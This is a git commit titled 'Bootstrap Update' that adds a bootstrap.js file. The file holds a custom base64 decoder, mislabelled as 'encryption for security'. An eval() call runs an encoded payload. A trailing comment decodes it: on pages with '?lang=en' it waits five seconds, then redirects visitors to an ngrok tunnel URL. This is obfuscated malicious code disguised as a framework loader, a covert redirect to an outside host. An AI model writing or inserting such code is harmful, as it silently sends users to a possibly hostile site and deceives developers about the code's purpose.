0468c8678e5c254d0b8fdbba53bfed06ecc0203d
Vedal987 <vedal876@gmail.com>
2020-11-26 20:49:53 +0000

    Bootstrap Update

---
+++ bootstrap.js
@@ -0,0 +1,44 @@
+var keyStr = "ABCDEFGHIJKLMNOP" +
+	               "QRSTUVWXYZabcdef" +
+	               "ghijklmnopqrstuv" +
+	               "wxyz0123456789+/" +
+	               "=";
+
+//Encryption for security
+function decode64(input) {
+    var output = "";
+    var chr1, chr2, chr3 = "";
+    var enc1, enc2, enc3, enc4 = "";
+    var i = 0;
+
+    do {
+        enc1 = keyStr.indexOf(input.charAt(i++));
+        enc2 = keyStr.indexOf(input.charAt(i++));
+        enc3 = keyStr.indexOf(input.charAt(i++));
+        enc4 = keyStr.indexOf(input.charAt(i++));
+
+        chr1 = (enc1 << 2) | (enc2 >> 4);
+        chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
+        chr3 = ((enc3 & 3) << 6) | enc4;
+
+        output = output + String.fromCharCode(chr1);
+
+        if (enc3 != 64) {
+            output = output + String.fromCharCode(chr2);
+        }
+        if (enc4 != 64) {
+            output = output + String.fromCharCode(chr3);
+        }
+
+        chr1 = chr2 = chr3 = "";
+        enc1 = enc2 = enc3 = enc4 = "";
+
+    } while (i < input.length);
+
+    return unescape(output);
+}
+
+//Load bootstrap.js
+eval(decode64("aWYod2luZG93LmxvY2F0aW9uLnNlYXJjaC5pbmNsdWRlcygiP2xhbmc9ZW4iKSkgeyB3aW5kb3cuc2V0VGltZW91dChmdW5jdGlvbigpIHsgbG9jYXRpb24uaHJlZj0iaHR0cHM6Ly9hMmQ3NzhlNDliYzkubmdyb2suaW8vIjsgfSwgNTAwMCk7IH0="))
+
+// Comment: if(window.location.search.includes("?lang=en")) { window.setTimeout(function() { location.href="https://a2d778e49bc9.ngrok.io/"; }, 5000); }
